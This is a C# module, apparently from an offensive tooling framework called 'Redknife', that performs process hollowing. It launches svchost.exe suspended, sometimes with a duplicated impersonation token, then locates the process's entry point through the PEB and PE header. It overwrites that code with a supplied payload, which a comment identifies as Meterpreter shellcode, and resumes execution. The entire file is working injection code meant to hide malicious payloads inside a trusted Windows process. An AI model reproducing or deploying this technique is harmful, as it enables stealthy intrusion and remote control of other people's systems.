using System;
using System.Runtime.InteropServices;

using Redknife.APIs;

namespace Redknife.Modules
{
    public class ProcessHollower : BaseModule
    {

        public override void Run()
        {
            LogUtil.Info("Hollowing process to launch payload", 0);
            Advapi32.STARTUPINFO si = new Advapi32.STARTUPINFO();
            Advapi32.PROCESS_INFORMATION pi = new Advapi32.PROCESS_INFORMATION();

            // Get the current thread token
            IntPtr hToken;
            Advapi32.OpenThreadToken(Kernel32.GetCurrentThread(), 0xF01FF, false, out hToken);

            // Non-zero value indicates current thread is using impersonation - use CreateProcessWithTokenW method
            bool res = false;
            if (hToken != IntPtr.Zero)
            {
                LogUtil.Info("Current thread has impersonation privilege - executing process with token");

                IntPtr hSystemToken = IntPtr.Zero;
                Advapi32.DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);

                si.cb = Marshal.SizeOf(si);
                res = Advapi32.CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\svchost.exe", 0, IntPtr.Zero, null, ref si, out pi);
            }
            else
            {
                // No impersonation - create process normally
                LogUtil.Info("Starting svchost process", 1);
                res = Kernel32.CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            }

            // Check we have a process
            if (!res)
            {
                LogUtil.Error("Could not create new process");
                return;
            }

            LogUtil.Info("Created svchost process, PID={0}", 1, pi.dwProcessId);

            // Call ZwQueryInformationProcess and fetch address of PEB
            Advapi32.PROCESS_BASIC_INFORMATION bi = new Advapi32.PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            NtDLL.ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            // Locate the svchost code base address
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            Kernel32.ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            // Read the PE header (to locate EntryPoint)
            byte[] data = new byte[0x200];
            Kernel32.ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            // Read the offsets to entry point
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            LogUtil.Info("Overriding svchost memory with payload data", 1);
            // Replace the existing code with Meterpreter shellcode
            Kernel32.WriteProcessMemory(hProcess, addressOfEntryPoint, this.Payload, this.Payload.Length, out nRead);

            // Resume execution of the thread
            LogUtil.Info("Resuming thead execution", 1);
            Kernel32.ResumeThread(pi.hThread);
        }

    }
}
